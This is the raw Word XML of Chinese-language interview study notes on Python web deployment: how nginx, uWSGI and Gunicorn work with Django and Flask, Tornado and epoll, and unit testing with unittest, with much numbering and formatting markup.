          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> uWISG </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>服务器之间如何配合工作的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29092D5A"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首先浏览器发起 http 请求到 nginx 服务器，Nginx 根据接收到请求包，进行 url 分析,判断访问的资源类型.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE74ED7"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如果是静态资源，直接读取静态资源返回给浏览器.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007BC90E" w14:textId="601D9B9A"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如果请求的是动态资源就转交给 uwsgi服务器，uwsgi 服务器根据自身的 uwsgi 和 WSGI 协议，找到对应的 Django 框架，Django 框架下的应用进行逻辑处理后，将返回值发送到 uwsgi 服务器，然后 uwsgi 服务器再返回给 nginx，最后 nginx将返回值返回给浏览器进行渲染显示给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DCD935" w14:textId="36ABBE9A" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00A2037A" w:rsidP="00EF28F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027</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谈一下你对</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> uWSGI </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14845B6B"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1.uWSGI 是一个 Web 服务器，它实现了 WSGI 协议、uwsgi、http 等协议。Nginx 中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E2F79D"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HttpUwsgiModule 的作用是与 uWSGI 服务器进行交换。WSGI 是一种 Web 服务器网关接口。它是一个 Web 服务器（如 nginx，uWSGI 等服务器）与 web 应用（如用 Flask 框架写的程序）通信的一种规范。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23620478"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要注意 WSGI / uwsgi / uWSGI 这三个概念的区分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282BAC44"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WSGI 是一种通信协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A39CB8E" w14:textId="77777777" w:rsidR="00D8288D"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uwsgi 是一种线路协议而不是通信协议，在此常用于在 uWSGI 服务器与其他网络服务器的数据通信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8585CB" w14:textId="2E7C8652"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uWSGI 是实现了 uwsgi 和 WSGI 两种协议的 Web 服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D58038" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>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nginx 是一个开源的高性能的 HTTP 服务器和反向代理：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE27F25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>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1.作为 web 服务器，它处理静态文件和索引文件效果非常高；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F805BD3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>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2.它的设计非常注重效率，最大支持 5 万个并发连接，但只占用很少的内存空间；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF35D14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>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3.稳定性高，配置简洁；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436AA349" w14:textId="5A4F9AD2" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>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4.强大的反向代理和负载均衡功能，平衡集群中各个服务器的负载压力应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D070447" w14:textId="739587E6" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00A2037A" w:rsidP="00EF28F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028</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Gunicorn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4C367C"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Gunicorn（绿色独角兽）是一个Python WSGI的HTTP服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BF47DD"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从Ruby的独角兽（Unicorn ）项目移植</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6231F8"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该Gunicorn服务器与各种Web框架兼容，实现非常简单，轻量级的资源消耗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A63AEE0"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Gunicorn直接用命令启动，不需要编写配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3070CDF2"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django+gunicorn+nginx理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099537A6"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lastRenderedPageBreak/>
        <w:t>我先尝试讲一下我对django + gunicorn + nginx 这三兄弟的理解。首先我们知道，我们访问网站，就是去网络上的一台电脑里访问某个路径下的某个文件，那django的作用主要是做（生产）这个文件，拿一家餐馆来讲，我认为django就是这个餐馆的厨师，他负责做菜，当规模很小的时候，比如路边卖鸡蛋饼的大妈，因为客人不多，所以可以自己问客人要什么，然后再自己做，这就是django和自带的runserver所做的事情；那当规模变大了，比如普通餐馆，客人很多，厨师做菜都来不急了，根本没时间去问客人要什么，所以这个时候我们就需要服务员了，服务员去记录客人要什么，然后跟厨房讲，接着从厨房拿菜给客人，而在这里，gunicorn就是这个服务员；当规模更大一些的时候，每分钟都有几百个人（现实中来讲这已经是多到爆炸了吧）要进餐馆吃饭，你在餐馆里安排再多的服务员也不能处理完这么多客人的请求，而且餐馆的空间是有限的，服务员也占空间，多了放不下，所以这个时候怎么办呢，答案是在餐馆门口安排咨客，有序地引导客人进入餐馆，也可以在门口就帮客人点好菜，提高整体效率，Nginx就扮演了咨客这个角色。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4796BB99"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新闻咨询可以用flask+nginx+gunicorn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413C130D" w14:textId="3C84A410" w:rsidR="00A63022" w:rsidRP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商城可以用django+nginx+uwsgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B3ABEB" w14:textId="270D31B8" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00D8288D" w:rsidP="00EF28F6">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>029</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Python </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中三大框架各自的应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD73A2D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRP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django：主要是用来快速开发的，他的亮点就是快速开发，节约成本，正常的并发量不过 10000， 如果要实现高并发的话，就要对 django 进行二次开发，比如把整个笨重的框架给拆掉，自己写 socket 实现 http 的通信，底层用纯 c，c++写提升效率，ORM 框架给干掉，自己编写封装与数据库交互的框架，因为啥呢，ORM 虽然面向对象来操作数据库，但是它的效率很低，使用外键来联系表与表之间的查询；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD13F17"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flask：轻量级，主要是用来写接口的一个框架，实现前后端分离，提升开发效率，Flask 本身相当于一个内核，其他几乎所有的功能都要用到扩展（邮件扩展 Flask-Mail，用户认证 Flask-Login），都需要用第三方的扩展来实现。比如可以用 Flask-extension 加入ORM、窗体验证工具，文件上传、身份验证等。Flask 没有默认使用的数据库，你可以选择 MySQL，也可以用 NoSQL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62513D97"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其 WSGI 工具箱采用 Werkzeug（路由模块），模板引擎则使用 Jinja2。这两个也是 Flask 框架的核心。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDFA816" w14:textId="356E44C6" w:rsidR="00A63022" w:rsidRP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Python最出名的框架要数 Django，此外还有 Flask、Tornado 等框架。虽然 Flask 不是最出名的框架，但是 Flask 应该算是最灵活的框架之一，这也是 Flask 受到广大开发者喜爱的原因。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4371F9" w14:textId="77777777" w:rsid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Tornado： Tornado 是一种 Web 服务器软件的开源版本。Tornado和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454048BB" w14:textId="61B4A5A4" w:rsidR="00A63022" w:rsidRP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得利于其非阻塞的方式和对 epoll 的运用，Tornado 每秒可以处理数以千计的连接，因此 Tornado 是实时 Web 服务的一个 理想框架。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E33079F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00D8288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8288D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>epoll是Linux内核为处理大批量文件描述符而作了改进的poll，是Linux下多路复用IO接口select/poll的增强版本，它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。另一点原因就是获取事件的时候，它无须遍历整个被侦听的描述符集，只要遍历那些被内核IO事件异步唤醒而加入Ready队列的描述符集合就行了。epoll除了提供select/poll那种IO事件的水平触发（Level Triggered）外，还提供了边缘触发（Edge Triggered），这就使得用户空间程序有可能缓存IO状态，减少epoll_wait/epoll_pwait的调用，提高应用程序效率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC07B5F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00A63022" w:rsidP="00EF28F6">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>30.</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>单元测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1656CE69"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单元测试就是开发者编写一小段代码，检验目标代码的功能是否符合预期。单元测试主要面向一些功能单一的模块进行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B848DD" w14:textId="1B3946D2"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在Web开发过程中，单元测试实际上就是一些“断言”（assert）代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D0018E"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t>断言就是判断一个函数或对象的一个方法所产生的结果是否符合你期望的那个结果。 python中assert断言是声明布尔值为真的判定，如果表达式为假会发生异常。单元测试中，一般使用assert来断言结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D8720F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037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A2037A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>比如登录、数据库等。对登录进行测试时，导入unittest测试框架,json，测试模块，定义一个类，继承unittest.TestCase，再使用setup和teardown方法，定义测试的预期情况的方式（以test开头），包括 “”“测试用户名与密码为空的情况[当参数不全的话，返回errcode=-2]”""，""“测试用户名和密码错误的情况[当登录名和密码错误的时候，返回 errcode = -1]”""，里面会用到 self.assertIn，self.assertEqual。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2472A3FB" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRDefault="00A63022" w:rsidP="003C49CC">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详见：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE48426" w14:textId="5D0989AE" w:rsidR="003942C2" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="003C49CC">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>python中的单元测试： </w:t>
      </w:r>
      <w:hyperlink r:id="rId356" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>https://blog.csdn.net/weixin_45476498/article/details/99707213</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:sectPr w:rsidR="003942C2" w:rsidRPr="00A63022" w:rsidSect="00C02F54">
      <w:pgSz w:w="16838" w:h="11906" w:orient="landscape" w:code="9"/>
      <w:pgMar w:top="567" w:right="567" w:bottom="567" w:left="567" w:header="992" w:footer="85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8B7A5" w14:textId="77777777" w:rsidR="00D96E02" w:rsidRDefault="00D96E02" w:rsidP="00C42547">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7F8797AD" w14:textId="77777777" w:rsidR="00D96E02" w:rsidRDefault="00D96E02" w:rsidP="00C42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ar(--monospace)">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DejaVu Sans Mono">
    <w:panose1 w:val="020B0609030804020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="E60026FF" w:usb1="D200F9FB" w:usb2="02000028" w:usb3="00000000" w:csb0="000001D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7954A" w14:textId="77777777" w:rsidR="00D96E02" w:rsidRDefault="00D96E02" w:rsidP="00C42547">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="10ADF807" w14:textId="77777777" w:rsidR="00D96E02" w:rsidRDefault="00D96E02" w:rsidP="00C42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2522C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00C252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14B5947"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="70C008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9D1562"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="019D15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246658A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="024665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2F75DC7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D4F0B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046C37"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="736EC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3407EF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="033407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3563355"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EDFE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E0974"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="038E097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4277DBD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="04277D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513535C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5990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45CA1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D21C18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9356263"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="093562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94133A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6EC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0C131A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1AB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807E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CB4C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0191B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A8C62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E53594"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0AE535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0C77519C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0C7751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CE55DED"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0CE55D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0E950D46"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0E950D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FEF7393"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0FEF739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304262F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1F3A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1E0754"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="131E07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5297993"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E34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656D5D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E0CAD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59232B8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="159232B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16D222B7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="16D222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9A15FED"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B8D0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8A447C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1A8A44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A8D5979"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6A105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AD2448"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="51B0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D04B78"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FF88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26132A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1C2613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1C286529"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1C2865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1C424A71"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1C424A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C8F56FB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5DB8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240BEA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="77E03F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BA4A89"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="65D6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D2A89"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="20BD2A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218768D0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7C40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995592"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="239955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23BF108E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ABCA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8A682D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="258A682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25EA497F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25EA497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29F90309"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="59F0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D60BE5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AD60B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2ADE4F55"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4DF06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AFC3636"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2AFC36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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2B616870"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9A60E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3114D0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2F3114D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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2F8D763C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2F8D76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31123596"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E694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9342E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="339342E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351B13E7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="351B13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373A64AB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="81121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BD14EC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="37BD14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38931CCF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="38931C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38AA1AD0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ADBA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FE0D13"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="39FE0D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3BA43A64"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="95C4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316065"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C1E4DB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3CC21F44"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4B881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8A68CE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3E8A68CE"/>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402579EC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="27E86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AE04B9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A44EDF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40C332E5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="40C332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417C73BF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="417C73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428A6009"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="428A60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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="429E6676"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1D942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42219A3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="94C2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050244"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1ACC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0B4BEF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A446A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A53C89"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3116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CF09E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0D02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DC6ED2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6D4A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9A651B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="499A651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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4A381D4D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4A381D4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4AB7086B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="680C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C61761"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4CC617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4D9172FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E7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083D1F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4E083D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4EEC0288"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="784453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4F9A020C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4F9A02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511A1AA3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1DB64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2AE145E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="169EFAF2"/>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2B24BEE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="66BE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C63700"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6BBA3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DA346D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="52DA34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530D50A6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="84763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61577B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="546157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548E17EB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="548E17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54DB1D2B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="70F2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0566E9"/>
    <w:multiLevelType w:val="multilevel"/>
